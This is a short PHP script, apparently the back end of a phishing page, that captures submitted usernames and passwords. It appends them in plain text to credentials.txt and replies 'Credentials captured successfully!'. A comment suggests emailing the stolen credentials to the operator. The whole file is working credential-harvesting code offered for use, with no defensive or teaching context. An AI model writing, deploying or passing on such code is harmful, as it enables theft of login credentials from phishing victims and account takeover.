<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    // Save credentials to a file
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
    // Optionally, you can send the credentials to your email or process them further
    echo "Credentials captured successfully!";
}
?>
